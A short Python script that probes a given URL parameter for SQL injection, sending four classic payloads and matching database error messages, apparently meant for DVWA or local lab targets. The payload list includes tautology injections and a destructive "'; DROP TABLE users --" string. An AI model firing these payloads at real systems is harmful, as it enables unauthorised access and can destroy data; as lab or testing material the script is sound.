import requests
import time

# SQL injection payloads
payloads = [
    "' OR '1'='1",
    "' OR 1=1 --",
    "'; DROP TABLE users --",
    "' OR 'a'='a"
]

# SQL error indicators
sql_errors = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark",
    "quoted string not properly terminated"
]

def scan_sql_injection(url, param):
    print(f"Scanning {url}...")
    vulnerable = False

    for payload in payloads:
        params = {param: payload}
        response = requests.get(url, params=params)
        content = response.text.lower()

        for error in sql_errors:
            if error in content:
                print(f"[VULNERABLE] Payload: {payload}")
                log_result(url, payload)
                vulnerable = True

        time.sleep(1)  # rate limiting

    if not vulnerable:
        print("[SAFE] No SQL Injection found")

def log_result(url, payload):
    with open("scan_report.txt", "a") as file:
        file.write(f"Vulnerable URL: {url}\n")
        file.write(f"Payload: {payload}\n\n")

if __name__ == "__main__":
    target_url = input("Enter target URL (DVWA/local): ")
    param_name = input("Enter parameter name (e.g. id): ")
    scan_sql_injection(target_url, param_name)